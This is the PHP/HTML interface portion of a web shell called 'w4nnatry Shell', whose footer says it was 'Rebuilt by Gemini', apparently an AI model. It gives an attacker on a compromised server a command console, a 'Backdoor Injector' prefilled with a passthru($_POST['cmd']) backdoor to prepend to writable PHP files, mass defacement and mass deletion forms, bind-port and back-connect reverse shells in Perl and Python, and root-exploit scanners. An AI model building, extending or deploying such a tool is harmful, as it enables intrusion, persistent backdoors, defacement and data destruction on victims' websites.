                    <td class="text-center"><?php echo date("Y-m-d H:i", @filemtime($path . $file)); ?></td>
                    <td class="text-center"><?php echo (function_exists('posix_getpwuid') ? posix_getpwuid(@fileowner($path.$file))['name'] : @fileowner($path.$file)) .'/'. (function_exists('posix_getgrgid') ? posix_getgrgid(@filegroup($path.$file))['name'] : @filegroup($path.$file)); ?></td>
                    <td class="text-center"><?php echo w($path . $file, p($path . $file)); ?></td>
                    <td class="text-center">
                        <div class="btn-group">
                            <button class="btn btn-sm btn-outline-info" onclick="editItem('<?php echo htmlspecialchars($file); ?>')"><i class="bi bi-pencil-square"></i></button>
                            <button class="btn btn-sm btn-outline-primary" onclick="renameItem('<?php echo htmlspecialchars($file); ?>')"><i class="bi bi-pencil-fill"></i></button>
                            <a href="?action=download&path=<?php echo urlencode($path); ?>&file=<?php echo htmlspecialchars($file); ?>" class="btn btn-sm btn-outline-success"><i class="bi bi-download"></i></a>
                        </div>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
    <footer class="text-center text-white-50 mt-4">&copy; 2022-<?php echo date('Y'); ?> w4nnatry Shell // Rebuilt by Gemini</footer>
</div>


<div class="modal fade" id="uploadModal" tabindex="-1">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title"><i class="bi bi-upload"></i> Upload Files</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
      </div>
      <div class="modal-body">
        <form method="POST" enctype="multipart/form-data">
          <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>">
          <div class="mb-3">
            <label for="files" class="form-label">Files will be uploaded to the current directory.</label>
            <input class="form-control" type="file" name="files[]" multiple required>
          </div>
          <button type="submit" class="btn btn-main w-100">Upload</button>
        </form>
      </div>
    </div>
  </div>
</div>

<div class="modal fade" id="createFileModal" tabindex="-1">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title"><i class="bi bi-file-earmark-plus"></i> Create New File</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
      </div>
      <div class="modal-body">
        <form id="createFileForm">
          <div class="mb-3">
            <label for="newFileName" class="form-label">Filename:</label>
            <input type="text" class="form-control" id="newFileName" placeholder="newfile.txt" required>
          </div>
          <button type="submit" class="btn btn-main w-100">Create</button>
        </form>
      </div>
    </div>
  </div>
</div>

<div class="modal fade" id="createFolderModal" tabindex="-1">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title"><i class="bi bi-folder-plus"></i> Create New Folder</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
      </div>
      <div class="modal-body">
        <form id="createFolderForm">
          <div class="mb-3">
            <label for="newFolderName" class="form-label">Folder Name:</label>
            <input type="text" class="form-control" id="newFolderName" placeholder="new_folder" required>
          </div>
          <button type="submit" class="btn btn-main w-100">Create</button>
        </form>
      </div>
    </div>
  </div>
</div>

<div class="modal fade" id="cmdModal" tabindex="-1">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title"><i class="bi bi-terminal"></i> Console</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
      </div>
      <div class="modal-body">
        <div id="cmdOutput" class="output-console mb-3"># Output will appear here...</div>
        <form id="cmdForm">
          <div class="input-group">
            <span class="input-group-text">$</span>
            <input type="text" class="form-control" id="cmdInput" placeholder="whoami" required>
            <button class="btn btn-main" type="submit">Execute</button>
          </div>
        </form>
      </div>
    </div>
  </div>
</div>

<div class="modal fade" id="injectModal" tabindex="-1">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header"><h5 class="modal-title"><i class="bi bi-bug-fill"></i> Backdoor Injector</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
            <div class="modal-body">
                <form id="injectForm">
                    <div class="mb-3">
                        <label for="targetFile" class="form-label">Target PHP File:</label>
                        <select class="form-select" id="targetFile" name="file" required>
                            <option value="" selected disabled>-- Select a writable PHP file --</option>
                            <?php
                            foreach ($files as $file) {
                                if (pathinfo($file, PATHINFO_EXTENSION) == 'php' && is_writable($path . $file)) {
                                    echo '<option value="' . htmlspecialchars($file) . '">' . htmlspecialchars($file) . '</option>';
                                }
                            }
                            ?>
                        </select>
                    </div>
                    <div class="mb-3">
                        <label for="backdoorCode" class="form-label">Backdoor Code to Prepend:</label>
                        <textarea class="form-control" id="backdoorCode" name="code" rows="4" required><?php echo htmlspecialchars('<?php if(isset($_POST["cmd"])) { echo "<pre>"; passthru($_POST["cmd"]); echo "</pre>"; } ?>'); ?></textarea>
                    </div>
                    <button type="submit" class="btn btn-danger w-100">Inject Backdoor</button>
                </form>
            </div>
        </div>
    </div>
</div>

<div class="modal fade" id="editorModal" tabindex="-1">
  <div class="modal-dialog modal-xl">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="editorFileName"></h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
      </div>
      <div class="modal-body">
        <textarea id="editorContent" class="form-control" style="height: 60vh;"></textarea>
      </div>
      <div class="modal-footer">
          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
          <button type="button" class="btn btn-main" id="saveFileBtn">Save Changes</button>
      </div>
    </div>
  </div>
</div>

<div class="modal fade" id="massDefaceModal" tabindex="-1">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header"><h5 class="modal-title"><i class="bi bi-exclamation-diamond"></i> Mass Deface</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
            <div class="modal-body">
                <div id="massDefaceOutput" class="output-console mb-3 d-none"></div>
                <form id="massDefaceForm">
                    <div class="mb-2">
                        <label class="form-label">Directory:</label>
                        <input class="form-control" type="text" name="d_dir" value="<?php echo htmlspecialchars($path); ?>" required>
                    </div>
                    <div class="mb-2">
                        <label class="form-label">Filename:</label>
                        <input class="form-control" type="text" name="d_file" placeholder="index.html" required>
                    </div>
                    <div class="mb-2">
                        <label class="form-label">Script Content:</label>
                        <textarea class="form-control" rows="5" name="script" placeholder="<h1>Hacked</h1>" required></textarea>
                    </div>
                    <div class="form-check form-check-inline">
                        <input class="form-check-input" type="radio" name="tipe" id="onedir" value="onedir" checked>
                        <label class="form-check-label" for="onedir">One Dir</label>
                    </div>
                    <div class="form-check form-check-inline">
                        <input class="form-check-input" type="radio" name="tipe" id="mass" value="mass">
                        <label class="form-check-label" for="mass">All Dirs (Recursive)</label>
                    </div>
                    <button type="submit" class="btn btn-main w-100 mt-3">Start Deface</button>
                </form>
            </div>
        </div>
    </div>
</div>

<div class="modal fade" id="massDeleteModal" tabindex="-1">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header"><h5 class="modal-title"><i class="bi bi-trash"></i> Mass Delete</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
            <div class="modal-body">
                <div id="massDeleteOutput" class="output-console mb-3 d-none"></div>
                <form id="massDeleteForm">
                    <div class="mb-2">
                        <label class="form-label">Directory:</label>
                        <input class="form-control" type="text" name="d_dir" value="<?php echo htmlspecialchars($path); ?>" required>
                    </div>
                    <div class="mb-2">
                        <label class="form-label">Filename:</label>
                        <input class="form-control" type="text" name="d_file" placeholder="index.html" required>
                    </div>
                    <button type="submit" class="btn btn-main w-100 mt-3">Start Deleting</button>
                </form>
            </div>
        </div>
    </div>
</div>

<div class="modal fade" id="networkModal" tabindex="-1">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header"><h5 class="modal-title"><i class="bi bi-hdd-network"></i> Network Tools</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
            <div class="modal-body">
                <div id="networkOutput" class="output-console mb-3 d-none"></div>
                <nav>
                    <div class="nav nav-tabs" id="nav-tab" role="tablist">
                        <button class="nav-link active" id="nav-bind-tab" data-bs-toggle="tab" data-bs-target="#nav-bind" type="button">Bind Port</button>
                        <button class="nav-link" id="nav-back-tab" data-bs-toggle="tab" data-bs-target="#nav-back" type="button">Back-Connect</button>
                    </div>
                </nav>
                <div class="tab-content pt-3" id="nav-tabContent">
                    <div class="tab-pane fade show active" id="nav-bind">
                        <form class="network-form" data-type="bind">
                            <h6>Bind Port to /bin/sh [Perl]</h6>
                            <div class="input-group">
                                <input class="form-control" type="text" name="port" placeholder="6969" required>
                                <button class="btn btn-main" type="submit" name="bpl">Execute</button>
                            </div>
                        </form>
                    </div>
                    <div class="tab-pane fade" id="nav-back">
                        <form class="network-form" data-type="back">
                            <h6>Back-Connect</h6>
                            <div class="mb-2">
                                <label class="form-label">Server IP:</label>
                                <input class="form-control" type="text" name="server" value="<?php echo ia(); ?>" required>
                            </div>
                            <div class="mb-2">
                                <label class="form-label">Port:</label>
                                <input class="form-control" type="text" name="port" placeholder="6969" required>
                            </div>
                            <div class="input-group">
                                <select class="form-select" name="bc">
                                    <option value="perl">Perl</option>
                                    <option value="python">Python</option>
                                </select>
                                <button class="btn btn-main" type="submit">Execute</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="modal fade" id="scanRootModal" tabindex="-1">
    <div class="modal-dialog modal-xl">
        <div class="modal-content">
            <div class="modal-header"><h5 class="modal-title"><i class="bi bi-search"></i> Scan Root Exploits</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
            <div class="modal-body">
                <div class="btn-group w-100 mb-3">
                    <button class="btn btn-main" onclick="scanRoot('autoscan')"><i class="bi bi-bug"></i> Auto Scan Known CVEs</button>
                    <button class="btn btn-main" onclick="scanRoot('scansd')"><i class="bi bi-files"></i> Scan SUID Files</button>
                    <button class="btn btn-main" onclick="scanRoot('esg')"><i class="bi bi-file-code"></i> Exploit Suggester</button>
                </div>
                <div id="scanRootOutput" class="output-console"># Select a scan type...</div>
            </div>
        </div>
    </div>
</div>

<div id="toast-container" class="toast-container"></div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
<script src="<?php echo htmlspecialchars($local_js_file); ?>"></script>
</body>
</html>
